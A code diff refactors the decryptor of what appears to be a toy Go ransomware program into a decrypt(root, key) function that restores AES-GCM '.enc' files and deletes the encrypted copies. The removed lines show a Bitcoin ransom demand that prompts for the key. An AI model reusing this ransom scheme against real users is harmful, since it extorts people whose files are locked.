@@ -1,19 +1,14 @@
 package main
 
 import (
-"fmt"
-"crypto/aes"
-"crypto/cipher"
-"path/filepath"
-"os"
+	"crypto/aes"
+	"crypto/cipher"
+	"fmt"
+	"os"
+	"path/filepath"
 )
 
-func main() {
-	fmt.Println("Please send me 0.2 btc and I will send you the key :)")
-	fmt.Print("Key: ")
-	var key string
-	fmt.Scanln(&key)
-
+func decrypt(root string, key string) {
 	// Initialize AES in GCM mode
 	block, err := aes.NewCipher([]byte(key))
 	if err != nil {
@@ -25,9 +20,9 @@ func main() {
 	}
 
 	// looping through target files
-	filepath.Walk("./home", func (path string, info os.FileInfo, err error) error {
+	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 		// skip if directory
-		if !info.IsDir() && path[len(path) - 4:] == ".enc" {
+		if !info.IsDir() && path[len(path)-4:] == ".enc" {
 			// decrypt the file
 			fmt.Println("Decrypting " + path + "...")
 
@@ -37,10 +32,10 @@ func main() {
 				// Decrypt bytes
 				nonce := encrypted[:gcm.NonceSize()]
 				encrypted = encrypted[gcm.NonceSize():]
-				original, err := gcm.Open(nil, nonce, encrypted, nil)		
-	
+				original, err := gcm.Open(nil, nonce, encrypted, nil)
+
 				// write decrypted contents
-				err = os.WriteFile(path[:len(path) - 4], original, 0666)
+				err = os.WriteFile(path[:len(path)-4], original, 0666)
 				if err == nil {
 					os.Remove(path) // delete the encrypted file
 				} else {
@@ -51,5 +46,6 @@ func main() {
 			}
 		}
 		return nil
-	});
+	})
+	fmt.Println("All files successfully decrypted.")
 }
